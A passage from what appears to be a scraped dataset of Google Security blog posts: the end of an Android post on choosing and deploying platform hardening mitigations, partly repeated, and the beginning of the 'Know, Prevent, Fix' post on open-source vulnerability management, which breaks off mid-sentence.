especially sensitive because many of these vulnerabilities were remotely reachable. This led to  a large architectural decomposition effort in Android Nougat , followed by additional efforts to  improve our ability to patch media vulnerabilities quickly . Thanks to these changes, in 2020 we had no internet-reachable Critical severity vulnerabilities reported to us in the media frameworks.     Deployment Considerations       Some of these mitigations provide more value than others, so it is important to focus engineering resources where they are most effective. This involves weighing the performance cost of each mitigation as well as how much work is required to deploy it and support it without negatively affecting device stability or user experience.      Performance        Understanding the performance impact of a mitigation is a critical step toward enabling it. Adding too much overhead to some components or the entire system can negatively impact user experience by reducing battery life and making the device less responsive. This is especially true for entry-level devices, which should benefit from hardening as well. We thus want to prioritize engineering efforts on impactful mitigations with acceptable overheads.     When investigating performance, important factors include not just CPU time but also memory increase, code size, battery life, and  UI jank . These factors are especially important to consider for more constrained entry-level devices, to ensure that the mitigations perform well across the entire Android ecosystem.     The system-wide performance impact of a mitigation is also dependent on where that mitigation is enabled, as certain components are more performance-sensitive than others. For example, binder is one of the most used paths for interprocess communication, so even small additional overhead could significantly impact user experience on a device. On the other hand, video players only need to ensure that frames are rendered at the source framerate; if frames are rendered much faster than the rate at which they are displayed, additional overhead may be more acceptable.     Benchmarks, if available, can be extremely useful to evaluate the performance impact of a mitigation. If there are no benchmarks for a certain component, new ones should be created, for instance by calling impacted codec code to decode a media file. If this testing reveals unacceptable overhead, there are often a few options to address it:       Selectively disable the mitigation in performance-sensitive functions identified during benchmarks. A small number of functions are often responsible for a large part of the runtime overhead, so disabling the mitigation in those functions can maximize the security benefit while minimizing the performance cost.  Here  is an example of this in one of the media codecs. These exempted functions must be manually reviewed for bugs to reduce the risk of disabling the mitigation there.    Optimize the implementation of the mitigation to improve its performance. This often involves modifying the compiler. For example, our team has upstreamed optimizations to the  Integer   Overflow  Sanitizer and the  Bounds  Sanitizer.    Certain mitigations, such as the Scudo allocator&#8217;s built-in robustness against heap-based vulnerabilities, have  tunable parameters  that can be tweaked to improve performance.       Most of these improvements involve changes or contributions to the LLVM project. By working with upstream LLVM, these improvements have impact and benefit beyond Android. At the same time Android benefits from upstream improvements when others in the LLVM community make improvements as well.      Deployment and Support        There is more to consider when enabling a mitigation than its security benefit and performance cost, such as the cost of short-term deployment and long-term support.     Deployment Stability Considerations       One important issue is whether a mitigation can contain false positives. For example, if the Bounds Sanitizer produces an error, there is definitely an out-of-bounds access (although it might not be exploitable). But the Integer Overflow Sanitizer can produce false positives, as many integer overflows are harmless or even perfectly expected and correct.     It is thus important to consider the impact of a mitigation on the stability of the system. Whether a crash is due to a false positive or a legitimate security issue, it still disrupts the user experience and so is undesirable. This is another reason to carefully consider which components should have which mitigations, as crashes in some components are worse than others. If a mitigation causes a crash in a media codec, the user&#8217;s video playback will be stopped, but if  netd  crashes during an update, the phone could be bricked. For a mitigation like Bounds Sanitizer, where false positives are not an issue, we still need to perform extensive testing to ensure the device remains stable. Off-by-one errors, for example, may not crash during normal operation, but Bounds Sanitizer would abort execution and result in instability.     Another consideration is whether it is possible to enumerate everything a mitigation might break. For example, it is not easy to contain the risk of the Integer Overflow Sanitizer without extensive testing, as it is difficult to determine which overflows are intentional/benign (and thus should be allowed) and which could lead to vulnerabilities.      Support        We must consider not just issues caused by deploying mitigations but also how to support them long-term. This includes the developer time to integrate a mitigation into existing systems, enable and debug it, deploy it onto devices, and support it after launch. SELinux is a good example of this; it takes a significant amount of effort to write the policy for a new device, and even once enforcing mode is enabled, the policy must be supported for years as code changes and functionality is added or removed.     We try to make mitigations less disruptive and spread awareness of how they affect developers. This is done by making documentation available on  source.android.com  and by improving existing algorithms to reduce false positives. Making it easier to debug mitigations when something goes wrong reduces the developer maintenance burden that can accompany mitigations. For example, when developers found it difficult to identify UBSan errors, we enabled  support  for the UBSan Minimal Runtime by default in the Android build system. The minimal runtime itself was first  upstreamed  by others at Google specifically for this purpose. When the Integer Overflow Sanitizer crashes a program, that adds the following hint to the generic SIGABRT crash message:           Abort message: 'ubsan: sub-overflow'       Developers who see this message then know to  enable diagnostics mode , which prints out details about the crash:           frameworks/native/services/surfaceflinger/SurfaceFlinger.cpp:2188:32: runtime error: unsigned integer overflow: 0 - 1 cannot be represented in type 'size_t' (aka 'unsigned long')       Similarly, upstream SELinux provides a tool called audit2allow that can be used to suggest rules to allow blocked behaviors:           adb logcat -d | audit2allow -p policy      #============= rmt ==============     allow rmt kmem_device:chr_file { read write };       A debugging tool does not need to be perfect to be helpful; audit2allow does not always suggest the correct options, but for developers without detailed knowledge of SELinux it provides a strong starting point.    Conclusion      With every Android release, our team works hard to balance security improvements that benefit the entire ecosystem with performance and stability, drawing heavily from the data that are available to us. We hope that this sheds some light on the particular challenges involved and the overall process that leads to mitigations introduced in each Android release.    Thank you to Jeff Vander Stoep for contributions to this blog post.                                     Posted by Kevin Deus, Joel Galenson, Billy Lau and Ivan Lozano, Android Security & Privacy Team  The Android platform team is committed to securing Android for every user across every device. In addition to monthly security updates to patch vulnerabilities reported to us through our Vulnerability Rewards Program (VRP), we also proactively architect Android to protect against undiscovered vulnerabilities through hardening measures such as applying compiler-based mitigations and improving sandboxing. This post focuses on the decision-making process that goes into these proactive measures: in particular, how we choose which hardening techniques to deploy and where they are deployed. As device capabilities vary widely within the Android ecosystem, these decisions must be made carefully, guided by data available to us to maximize the value to the ecosystem as a whole.   The overall approach to Android Security is multi-pronged and leverages several principles and techniques to arrive at data-guided solutions to make future exploitation more difficult. In particular, when it comes to hardening the platform, we try to answer the following questions:      What data are available and how can they guide security decisions?   What mitigations are available, how can they be improved, and where should they be enabled?   What are the deployment challenges of particular mitigations and what tradeoffs are there to consider?     By shedding some light on the process we use to choose security features for Android, we hope to provide a better understanding of Android's overall approach to protecting our users.  Data-driven security decision-making    We use a variety of sources to determine what areas of the platform would benefit the most from different types of security mitigations. The Android Vulnerability Rewards Program (VRP) is one very informative source: all vulnerabilities submitted through this program are analyzed by our security engineers to determine the root cause of each vulnerability and its overall severity (based on these guidelines). Other sources are internal and external bug-reports, which identify vulnerable components and reveal coding practices that commonly lead to errors. Knowledge of problematic code patterns combined with the prevalence and severity of the vulnerabilities they cause can help inform decisions about which mitigations are likely to be the most beneficial.  Types of Critical and High severity vulnerabilities fixed in Android Security Bulletins in 2019   Relying purely on vulnerability reports is not sufficient as the data are inherently biased: often, security researchers flock to \"hot\" areas, where other researchers have already found vulnerabilities (e.g. Stagefright). Or they may focus on areas where readily-available tools make it easier to find bugs (for instance, if a security research tool is posted to Github, other researchers commonly utilize that tool to explore deeper).   To ensure that mitigation efforts are not biased only toward areas where bugs and vulnerabilities have been reported, internal Red Teams analyze less scrutinized or more complex parts of the platform. Also, continuous automated fuzzers run at-scale on both Android virtual machines and physical devices. This also ensures that bugs can be found and fixed early in the development lifecycle. Any vulnerabilities uncovered through this process are also analyzed for root cause and severity, which inform mitigation deployment decisions.   The Android VRP rewards submissions of full exploit-chains that demonstrate a full end-to-end attack. These exploit-chains, which generally utilize multiple vulnerabilities, are very informative in demonstrating techniques that attackers use to chain vulnerabilities together to accomplish their goals. Whenever a researcher submits a full exploit chain, a team of security engineers analyzes and documents the overall approach, each link in the chain, and any innovative attack strategies used. This analysis informs which exploit mitigation strategies could be employed to prevent pivoting directly from one vulnerability to another (some examples include Address Space Layout Randomization and Control-Flow Integrity) and whether the process’s attack surface could be reduced if it has unnecessary access to resources.   There are often multiple different ways to use a collection of vulnerabilities to create an exploit chain. Therefore a defense-in-depth approach is beneficial, with the goal of reducing the usefulness of some vulnerabilities and lengthening exploit chains so that successful exploitation requires more vulnerabilities. This increases the cost for an attacker to develop a full exploit chain.   Keeping up with developments in the wider security community helps us understand the current threat landscape, what techniques are currently used for exploitation, and what future trends look like. This involves but is not limited to:    Close collaboration with the external security research community  Reading journals and attending conferences  Monitoring techniques used by malware  Following security research trends in security communities  Participating in external efforts and projects such as KSPP, syzbot, LLVM, Rust, and more    All of these data sources provide feedback for the overall security hardening strategy, where new mitigations should be deployed, and what existing security mitigations should be improved.  Reasoning About Security Hardening   Hardening and Mitigations    Analyzing the data reveals areas where broader mitigations can eliminate entire classes of vulnerabilities.  For instance, if parts of the platform show a large number of vulnerabilities due to integer overflow bugs, they are good candidates to enable Undefined Behavior Sanitizer (UBSan) mitigations such as the Integer Overflow Sanitizer.  When common patterns in memory access vulnerabilities appear, they inform efforts to build hardened memory allocators (enabled by default in Android 11) and implement mitigations (such as CFI) against exploitation techniques that provide better resilience against memory overflows or Use-After-Free vulnerabilities.   Before discussing how the data can be used, it is important to understand how we classify our overall efforts in hardening the platform. There are a few broadly defined buckets that hardening techniques and mitigations fit into (though sometimes a particular mitigation may not fit cleanly into any single one):    Exploit mitigations     Deterministic runtime prevention of vulnerabilities detects undefined or unexpected behavior and aborts execution when the behavior is detected. This turns potential memory corruption vulnerabilities into less harmful crashes. Often these mitigations can be enabled selectively and still be effective because they impact individual bugs. Examples include Integer Sanitizer and Bounds Sanitizer.   Exploitation technique mitigations target the techniques used to pivot from one vulnerability to another or to gain code execution. These mitigations theoretically may render some vulnerabilities useless, but more often serve to constrain the actions available to attackers seeking to exploit vulnerabilities. This increases the difficulty of exploit development in terms of time and resources. These mitigations may need to be enabled across an entire process's memory space to be effective. Examples include Address Space Layout Randomization, Control Flow Integrity (CFI), Stack Canaries and Memory Tagging.   Compiler transformations that change undefined behavior to defined behavior at compile-time. This prevents attackers from taking advantage of undefined behavior such as uninitialized memory. An example of this is stack initialization.     Architectural decomposition     Splits larger, more privileged components into smaller pieces, each of which has fewer privileges than the original. After this decomposition, a vulnerability in one of the smaller components will have reduced severity by providing less access to the system, lengthening exploit chains, and making it harder for an attacker to gain access to sensitive data or additional privilege escalation paths.     Sandboxing/isolation     Related to architectural decomposition, enforces a minimal set of permissions/capabilities that a process needs to correctly function, often through mandatory and/or discretionary access control. Like architectural decomposition, this makes vulnerabilities in these processes less valuable as there are fewer things attackers can do in that execution context, by applying the principle of least privilege. Some examples are Android Permissions, Unix Permissions, Linux Capabilities, SELinux, and Seccomp.     Migrating to memory-safe languages     C and C++ do not provide memory safety the way that languages like Java, Kotlin, and Rust do. Given that the majority of security vulnerabilities reported to Android are memory safety issues, a two-pronged approach is applied: improving the safety of C/C++ while also encouraging the use of memory safe languages.       Enabling these mitigations    With the broad arsenal of mitigation techniques available, which of these to employ and where to apply them depends on the type of problem being solved. For instance, a monolithic process that handles a lot of untrusted data and does complex parsing would be a good candidate for all of these. The media frameworks provide an excellent historical example where an architectural decomposition enabled incrementally turning on more exploit mitigations and deprivileging.  Architectural decomposition and isolation of the Media Frameworks over time   Remotely reachable attack surfaces such as NFC, Bluetooth, WiFi, and media components have historically housed the most severe vulnerabilities, and as such these components are also prioritized for hardening. These components often contain some of the most common vulnerability root causes that are reported in the VRP, and we have recently enabled sanitizers in all of them.   Libraries and processes that enforce or sit at security boundaries, such as libbinder, and widely-used core libraries such as libui, libcore, and libcutils are good targets for exploit mitigations since these are not process-specific. However, due to performance and stability sensitivities around these core libraries, mitigations need to be supported by strong evidence of their security impact.    Finally, the kernel’s high level of privilege makes it an important target for hardening as well. Because different codebases have different characteristics and functionality, susceptibility to and prevalence of certain kinds of vulnerabilities will differ. Stability and performance of mitigations here are exceptionally important to avoid negatively impacting the user experience, and some mitigations that make sense to deploy in user space may not be applicable or effective. Therefore our considerations for which hardening strategies to employ in the kernel are based on a separate analysis of the available kernel-specific data.    This data-driven approach has led to tangible and measurable results. Starting in 2015 with Stagefright, a large number of Critical severity vulnerabilities were reported in Android's media framework. These were especially sensitive because many of these vulnerabilities were remotely reachable. This led to a large architectural decomposition effort in Android Nougat, followed by additional efforts to improve our ability to patch media vulnerabilities quickly. Thanks to these changes, in 2020 we had no internet-reachable Critical severity vulnerabilities reported to us in the media frameworks.  Deployment Considerations    Some of these mitigations provide more value than others, so it is important to focus engineering resources where they are most effective. This involves weighing the performance cost of each mitigation as well as how much work is required to deploy it and support it without negatively affecting device stability or user experience.  Performance    Understanding the performance impact of a mitigation is a critical step toward enabling it. Adding too much overhead to some components or the entire system can negatively impact user experience by reducing battery life and making the device less responsive. This is especially true for entry-level devices, which should benefit from hardening as well. We thus want to prioritize engineering efforts on impactful mitigations with acceptable overheads.   When investigating performance, important factors include not just CPU time but also memory increase, code size, battery life, and UI jank. These factors are especially important to consider for more constrained entry-level devices, to ensure that the mitigations perform well across the entire Android ecosystem.   The system-wide performance impact of a mitigation is also dependent on where that mitigation is enabled, as certain components are more performance-sensitive than others. For example, binder is one of the most used paths for interprocess communication, so even small additional overhead could significantly impact user experience on a device. On the other hand, video players only need to ensure that frames are rendered at the source framerate; if frames are rendered much faster than the rate at which they are displayed, additional overhead may be more acceptable.   Benchmarks, if available, can be extremely useful to evaluate the performance impact of a mitigation. If there are no benchmarks for a certain component, new ones should be created, for instance by calling impacted codec code to decode a media file. If this testing reveals unacceptable overhead, there are often a few options to address it:    Selectively disable the mitigation in performance-sensitive functions identified during benchmarks. A small number of functions are often responsible for a large part of the runtime overhead, so disabling the mitigation in those functions can maximize the security benefit while minimizing the performance cost. Here is an example of this in one of the media codecs. These exempted functions must be manually reviewed for bugs to reduce the risk of disabling the mitigation there.  Optimize the implementation of the mitigation to improve its performance. This often involves modifying the compiler. For example, our team has upstreamed optimizations to the Integer Overflow Sanitizer and the Bounds Sanitizer.  Certain mitigations, such as the Scudo allocator’s built-in robustness against heap-based vulnerabilities, have tunable parameters that can be tweaked to improve performance.    Most of these improvements involve changes or contributions to the LLVM project. By working with upstream LLVM, these improvements have impact and benefit beyond Android. At the same time Android benefits from upstream improvements when others in the LLVM community make improvements as well.  Deployment and Support    There is more to consider when enabling a mitigation than its security benefit and performance cost, such as the cost of short-term deployment and long-term support.  Deployment Stability Considerations    One important issue is whether a mitigation can contain false positives. For example, if the Bounds Sanitizer produces an error, there is definitely an out-of-bounds access (although it might not be exploitable). But the Integer Overflow Sanitizer can produce false positives, as many integer overflows are harmless or even perfectly expected and correct.   It is thus important to consider the impact of a mitigation on the stability of the system. Whether a crash is due to a false positive or a legitimate security issue, it still disrupts the user experience and so is undesirable. This is another reason to carefully consider which components should have which mitigations, as crashes in some components are worse than others. If a mitigation causes a crash in a media codec, the user’s video playback will be stopped, but if netd crashes during an update, the phone could be bricked. For a mitigation like Bounds Sanitizer, where false positives are not an issue, we still need to perform extensive testing to ensure the device remains stable. Off-by-one errors, for example, may not crash during normal operation, but Bounds Sanitizer would abort execution and result in instability.   Another consideration is whether it is possible to enumerate everything a mitigation might break. For example, it is not easy to contain the risk of the Integer Overflow Sanitizer without extensive testing, as it is difficult to determine which overflows are intentional/benign (and thus should be allowed) and which could lead to vulnerabilities.  Support    We must consider not just issues caused by deploying mitigations but also how to support them long-term. This includes the developer time to integrate a mitigation into existing systems, enable and debug it, deploy it onto devices, and support it after launch. SELinux is a good example of this; it takes a significant amount of effort to write the policy for a new device, and even once enforcing mode is enabled, the policy must be supported for years as code changes and functionality is added or removed.   We try to make mitigations less disruptive and spread awareness of how they affect developers. This is done by making documentation available on source.android.com and by improving existing algorithms to reduce false positives. Making it easier to debug mitigations when something goes wrong reduces the developer maintenance burden that can accompany mitigations. For example, when developers found it difficult to identify UBSan errors, we enabled support for the UBSan Minimal Runtime by default in the Android build system. The minimal runtime itself was first upstreamed by others at Google specifically for this purpose. When the Integer Overflow Sanitizer crashes a program, that adds the following hint to the generic SIGABRT crash message:         Abort message: 'ubsan: sub-overflow'     Developers who see this message then know to enable diagnostics mode, which prints out details about the crash:         frameworks/native/services/surfaceflinger/SurfaceFlinger.cpp:2188:32: runtime error: unsigned integer overflow: 0 - 1 cannot be represented in type 'size_t' (aka 'unsigned long')     Similarly, upstream SELinux provides a tool called audit2allow that can be used to suggest rules to allow blocked behaviors:         adb logcat -d | audit2allow -p policy      #============= rmt ==============     allow rmt kmem_device:chr_file { read write };     A debugging tool does not need to be perfect to be helpful; audit2allow does not always suggest the correct options, but for developers without detailed knowledge of SELinux it provides a strong starting point.  Conclusion    With every Android release, our team works hard to balance security improvements that benefit the entire ecosystem with performance and stability, drawing heavily from the data that are available to us. We hope that this sheds some light on the particular challenges involved and the overall process that leads to mitigations introduced in each Android release.  Thank you to Jeff Vander Stoep for contributions to this blog post.     ", "date": "January 29, 2021"},
{"website": "Google-Security", "title": "\nKnow, Prevent, Fix: A framework for shifting the discussion around vulnerabilities in open source\n", "author": ["Posted by Eric Brewer, Rob Pike, Abhishek Arya, Anne Bertucio and Kim Lewandowski "], "link": "https://security.googleblog.com/2021/02/know-prevent-fix-framework-for-shifting.html", "abstract": "                             Posted by Eric Brewer, Rob Pike, Abhishek Arya, Anne Bertucio and Kim Lewandowski&nbsp;              Executive Summary:      The security of open source software has rightfully garnered the industry&#8217;s attention, but solutions require consensus about the challenges and cooperation in the execution. The problem is complex and there are many facets to cover: supply chain, dependency management, identity, and build pipelines. Solutions come faster when the problem is well-framed; we propose a framework (&#8220;Know, Prevent, Fix&#8221;) for how the industry can think about vulnerabilities in open source and concrete areas to address first, including:        Consensus on metadata and identity standards:  We need consensus on fundamentals to tackle these complex problems as an industry. Agreements on metadata details and identities will enable automation, reduce the effort required to update software, and minimize the impact of vulnerabilities.     Increased transparency and review for critical software:  For software that is critical to security, we need to agree on development processes that ensure sufficient review, avoid unilateral changes, and transparently lead to well-defined, verifiable official versions.       The following framework and goals are proposed with the intention of sparking industry-wide discussion and progress on the security of open source software.                    Due to  recent events , the software world gained a deeper understanding about the real risk of supply-chain attacks. Open source software  should  be less risky on the security front, as all of the code and dependencies are in the open and available for inspection and verification. And while that is generally true, it assumes people are actually looking. With so many dependencies, it is impractical to monitor them all, and many open source packages are not well maintained.      It is common for a program to depend, directly or indirectly, on thousands of packages and libraries. For example, Kubernetes now depends on about 1,000 packages. Open source likely makes  more  use of  dependencies  than closed source, and from a wider range of suppliers; the number of distinct entities that need to be trusted can be  very high . This makes it extremely difficult to understand how open source is used in products and what vulnerabilities might be relevant. There is also no assurance that what is built matches the source code.      Taking a step back, although supply-chain attacks are a risk, the vast majority of vulnerabilities are mundane and unintentional&#8212;honest errors made by well-intentioned developers. Furthermore, bad actors are more likely to exploit known vulnerabilities than to find their own: it&#8217;s just easier. As such, we must focus on making fundamental changes to address the majority of vulnerabilities, as doing so will move the entire industry far along in addressing the complex cases as well, including supply-chain attacks.     Few organizations can verify all of the packages they use, let alone all of the updates to those packages. In the current landscape, tracking these packages takes a non-trivial amount of infrastructure, and significant manual effort. At Google, we have those resources and go to extraordinary lengths to manage the open source packages we use&#8212;including keeping a private repo of all open source packages we use internally&#8212;and it is  still  challenging to track all of the updates. The sheer flow of updates is daunting. A core part of any solution will be more automation, and this will be a key theme for our open source security work in 2021 and beyond.      Because this is a complex problem that needs industry cooperation, our purpose here is to focus the conversation around concrete goals. Google co-founded the  OpenSSF  to be a focal point for this collaboration, but to make progress, we need participation across the industry, and agreement on what the problems are and how we might address them. To get the discussion started, we present one way to frame this problem, and a set of concrete goals that we hope will accelerate industry-wide solutions.     We suggest framing the challenge as three largely independent problem areas, each with concrete objectives:        Know  about the vulnerabilities in your software     Prevent  the addition of new vulnerabilities, and     Fix  or remove vulnerabilities.       A related but separate problem, which is critical to securing the supply chain, is improving the security of the development process. We&#8217;ve outlined the challenges of this problem and proposed goals in the fourth section, Prevention for Critical Software.    Know your Vulnerabilities      Knowing your vulnerabilities is harder than expected for many reasons. Although there are mechanisms for reporting vulnerabilities, it is hard to know if they actually affect the specific versions of software you are using.       Goal: Precise Vulnerability Data      First, it is crucial to capture precise vulnerability metadata from all available data sources. For example, knowing which version introduced a vulnerability helps determine if one's software is affected, and knowing when it was fixed results in accurate and timely patching (and a reduced window for potential exploitation). Ideally, this triaging workflow should be automated.     Second, most vulnerabilities are in your dependencies, rather than the code you write or control directly. Thus, even when your code is not changing, there can be a constant churn in your vulnerabilities: some get fixed and others get added.  1        Goal: Standard Schema for Vulnerability Databases      Infrastructure and industry standards are needed to track and maintain open source vulnerabilities, understand their consequences, and manage their mitigations. A standard vulnerability schema would allow common tools to work across multiple vulnerability databases and simplify the task of tracking, especially when vulnerabilities touch multiple languages or subsystems.      Goal: Accurate Tracking of Dependencies      Better tooling is needed to understand quickly what software is affected by a newly discovered vulnerability, a problem made harder by the scale and dynamic nature of large dependency trees. Current practices also often make it difficult to predict exactly what versions are used without actually doing an installation, as the software for version resolution is only available through the installer.    Prevent New Vulnerabilities      It would be ideal to prevent vulnerabilities from ever being created, and although testing and analysis tools can help, prevention will always be a hard problem. Here we focus on two specific aspects:       Understanding risks when deciding on a new dependency    Improving development processes for critical software        Goal: Understand the Risks for New Dependencies      The first category is essentially knowing about vulnerabilities at the time you decide to use a package. Taking on a new dependency has inherent risk and it needs to be an informed decision. Once you have a dependency, it generally becomes harder to remove over time.     Knowing about vulnerabilities is a great start, but there is more that we can do.     Many vulnerabilities arise from lack of adherence to security best practices in software development processes. Are all contributors using two-factor authentication (2FA)? Does the project have continuous integration set up and running tests? Is fuzzing integrated? These are the types of security checks that would help consumers understand the risks they&#8217;re taking on with new dependencies. Packages with a low &#8220;score&#8221; warrant a closer review, and a plan for remediation.     The recently announced  Security Scorecards  project from OpenSSF attempts to generate these data points in a fully automated way. Using scorecards can also help defend against  prevalent typosquatting attacks  (malevolent packages with names similar to popular packages), since they would score much lower and fail many security checks.     Improving the development processes for critical software is related to vulnerability prevention, but deserves its own discussion further down in our post.    Fix or Remove Vulnerabilities      The general problem of fixing vulnerabilities is beyond our scope, but there is much we can do for the specific problem of managing vulnerabilities in software dependencies. Today there is little help on this front, but as we improve precision it becomes worthwhile to invest in new processes and tooling.     One option of course is to fix the vulnerability directly. If you can do this in a backwards-compatible way, then the fix is available for everyone. But a challenge is that you are unlikely to have expertise on the problem, nor the direct ability to make changes. Fixing a vulnerability also assumes the software maintainers are aware of the issue, and have the knowledge and resources for vulnerability disclosure.           Conversely, if you simply remove the dependency that contains the vulnerability, then it is fixed for you and those that import or use your software, but not for anyone else. This is a change that is under your direct control.     These scenarios represent the two ends of the chain of dependencies between your software and the vulnerability, but in practice there can be many intervening packages. The general hope is that someone along that dependency chain will fix it. Unfortunately, fixing a link is not enough: Every link of the dependency chain between you and the vulnerability needs to be updated before your software will be fixed. Each link must include the fixed version of the thing below it to purge the vulnerability. Thus, the updates need to be done from the bottom up, unless you can eliminate the dependency altogether, which may require similar heroics and is rarely possible&#8212;but is the best solution when it is.       Goal: Understand your Options to Remove Vulnerabilities       Today, we lack clarity on this process: what progress has been made by others and what upgrades should be applied at what level? And where is the process stuck? Who is responsible for fixing the vulnerability itself? Who is responsible for propagating the fix?      Goal: Notifications to Speed Repairs      Eventually, your dependencies will be fixed and you can locally upgrade to the new versions. Knowing when this happens is an important goal as it accelerates reducing the exposure to vulnerabilities. We also need a notification system for the actual discovery of vulnerabilities; often new vulnerabilities represent latent problems that are newly discovered even though the actual code has not changed (such as this  10-year old vulnerability in the Unix utility sudo ). For large projects, most such issues will arise in the indirect dependencies. Today, we lack the precision required to do notification well, but as we improve vulnerability precision and metadata (as above), we should also drive notification.      So far, we have only described the easy case: a sequence of upgrades that are all backwards compatible, implying that the behavior is the same except for the absence of the vulnerability.      In practice, an upgrade is often not backward compatible, or is blocked by restrictive  version  requirements. These issues mean that updating a package deep in the dependency tree must cause some churn, or at least requirement updates, in the things above it. The situation often arises when the fix is made to the latest version, say 1.3, but your software or intervening packages request 1.2. We see this situation often, and it remains a big challenge that is made even harder by the difficulty of getting owners to update intervening packages. Moreover, if you use a package in a thousand places, which is not crazy for a big enterprise, you might need to go through the update process a thousand times.      Goal: Fix the Widely Used Versions      It&#8217;s also important to fix the vulnerability in the older versions, especially those in heavy use. Such repair is common practice for the subset of software that has long-term support, but ideally all widely used versions should be fixed, especially for security risks.     Automation could help: given a fix for one version, perhaps we can generate good candidate fixes for other versions. This process is sometimes done by hand today, but if we can make it significantly easier, more versions will actually get patched, and there will be less work to do higher in the chain.     To summarize, we need ways to make fixing vulnerabilities, especially in dependencies, both easier and more timely. We need to increase the chance that there is a fix for widely used versions and not just for the latest version, which is often hard to adopt due to the other changes it includes.     Finally, there are many other options on the &#8220;fixing&#8221; front, including various kinds of mitigations, such as avoiding certain methods, or limiting risk through sandboxes or access controls. These are important practical options that need more discussion and support.    Prevention for Critical Software      The framing above applies broadly to vulnerabilities, regardless of whether they are due to bad actors or are merely innocent mistakes. Although the suggested goals cover most vulnerabilities, they are not sufficient to prevent malicious behavior. To have a meaningful impact on prevention for bad actors, including supply-chain attacks, we need to improve the processes used for development.     This is a big task, and currently unrealistic for the majority of open source. Part of the beauty of open source is its lack of constraints on the process, which encourages a wide range of contributors. However, that flexibility can hinder security considerations. We want contributors, but we cannot expect everyone to be equally focused on security. Instead, we must identify critical packages and protect them. Such critical packages must be held to a range of higher development standards, even though that might add developer friction.      Goal: Define Criteria for &#8220;Critical&#8221; Open Source Projects that Merit Higher Standards      It is important to identify the &#8220;critical&#8221; packages that we all depend upon and whose compromise would endanger critical infrastructure or user privacy. These packages need to be held to higher standards, some of which we outline below.      It is not obvious how to define &#8220;critical&#8221; and the definition will likely expand over time. Beyond obvious software, such as OpenSSL or key cryptographic libraries, there are widely used packages where their sheer reach makes them worth protecting. We started the  Criticality Score project  to brainstorm this problem with the community, as well collaborating with Harvard on the Open Source Census efforts.      Goal: No Unilateral Changes to Critical Software      One principle that we follow across Google is that changes should not be unilateral&#8212;that is, every change involves at least an author and a reviewer or approver. The goal is to limit what an adversary can do on their own&#8212;we need to make sure someone is actually looking at the changes. To do this well for open source is actually quite a bit harder than just within a single company, which can have strong authentication and enforce code reviews and other checks.     Avoiding unilateral changes can be broken down into two sub-goals:           Goal: Require Code Review for Critical Software           Besides being a great process for improving code, reviews ensure that at least one person other than the author is looking at every change. Code reviews are a standard practice for all changes within Google.           Goal: Changes to Critical Software Require Approval by Two Independent Parties           To really achieve the &#8220;someone is looking&#8221; goal, we need the reviewer to be independent from the contributor. And for critical changes, we probably want more than one independent review. We need to sort out what counts as &#8220;independent&#8221; review, of course, but the idea of independence is fundamental to reviews in most industries.        Goal: Authentication for Participants in Critical Software      Any notion of independence also implies that you know the actors&#8212;an anonymous actor cannot be assumed to be independent or trustworthy. Today, we essentially have pseudonyms: the same person uses an identity repeatedly and thus can have a reputation, but we don&#8217;t always know the individual&#8217;s trustworthiness. This leads to a range of subgoals:           Goal: For Critical Software, Owners and Maintainers Cannot be Anonymous           Attackers like to have anonymity. There have been past supply-chain attacks where attackers capitalized on anonymity and worked their way through package communities to become maintainers, without anyone realizing this &#8220;new maintainer&#8221; had malicious intent (compromising source code was eventually injected upstream). To mitigate this risk, our view is that owners and maintainers of critical software must not be anonymous.          It is conceivable that contributors, unlike owners and maintainers, could be anonymous, but only if their code has passed multiple reviews by trusted parties.           It is also conceivable that we could have &#8220;verified&#8221; identities, in which a trusted entity knows the real identity, but for privacy reasons the public does not. This would enable decisions about independence as well as prosecution for illegal behavior.           Goal: Strong Authentication for Contributors of Critical Software           Malicious actors look for easy attack vectors, so phishing attacks and other forms of theft related to credentials are common. One obvious improvement would be the required use of two-factor authentication, especially for owners and maintainers.            Goal: A Federated Model for Identities           To continue the inclusive nature of open source, we need to be able to trust a wide range of identities, but still with verified integrity. This implies a federated model for identities, perhaps similar to how we support federated SSL certificates today&#8212;a range of groups can generate valid certificates, but with strong auditing and mutual oversight.       Discussions  on this topic are starting to take place in the OpenSSF&#8217;s  Digital Identity Attestation Working Group .      Goal: Notification for Changes in Risk      We should extend notifications to cover changes in risk. The most obvious is ownership changes, which can be a prelude to new attacks (such as the recent NPM  event-stream compromise ). Other examples include discovery of stolen credentials, collusion, or other bad actor behavior.      Goal: Transparency for Artifacts      It is common to use secure hashes to detect if an artifact has arrived intact, and digital signatures to prove authenticity. Adding &#8220;transparency&#8221; means that these attestations are logged publicly and thus document what was intended. In turn, external parties can monitor the logs for fake versions even if users are unaware. Going a step further, when credentials are stolen, we can know what artifacts were signed using those credentials and work to remove them. This kind of transparency, including the durable public logs and the third-party monitoring, has been used to great success for  SSL certificates , and we have  proposed  one way to do this for package managers. Knowing you have the right package or binary is similar to knowing you are visiting the real version of a web site.      Goal: Trust the Build Process      Ken Thompson's Turing Award  lecture  famously demonstrated in 1984 that authentic source code alone is not enough, and  recent events  have shown this attack is a real threat. How do you trust your build system? All the components of it must be trusted and verified through a continuous process of building trust.     Reproducible builds help&#8212;there is a deterministic outcome for the build and we can thus verify that we got it right&#8212;but are harder to achieve due to ephemeral data (such as timestamps) ending up in the release artifact. And safe reproducible builds require verification tools, which in turn must be built verifiably and reproducibly, and so on. We must construct a network of trusted tools and build products.     Trust in both the artifacts and the tools can be established via &#8220;delegation&#8221;, through a variant of the transparency process described above called  binary authorization . Internally, the Google build system signs all artifacts and produces a manifest that ties it to the source code. For open source, one or more trusted agents could run the build as a service, signing the artifact to prove that they are accountable for its integrity. This kind of ecosystem should exist and mostly needs awareness and some agreements on the format of attestations, so that we can automate the processes securely.     The actions in this section are great for software in general, and are essentially in use today within Google, but they are heavier weight than usual for open source. Our hope is that by focusing on the subset of software that is critical, we can achieve these goals at least for that set. As the tooling and automation get better, these goals will become easier to adopt more widely.    Summary      The nature of open source requires that we solve problems through consensus and collaboration. For complex topics such as vulnerabilities, this implies focused discussion around the key issues. We presented one way to frame this discussion, and defined a set of goals that we hope will accelerate industry-wide discourse and the ultimate solutions. The first set of goals apply broadly to vulnerabilities and are really about enabling automation and reducing risk and toil.             However, these goals are not enough in the presence of adversaries or to prevent &#8220;supply chain&#8221; attacks. Thus we propose a second set of goals for critical software. The second set is more onerous and therefore will meet some resistance, but we believe the extra constraints are fundamental for security. The intention is to define collectively the set of &#8220;critical&#8221; software packages, and apply these higher standards only to this set.        Although we have various opinions on how to meet both sets of goals, we are but one voice in a space where consensus and sustainable solutions matter most of all. We look 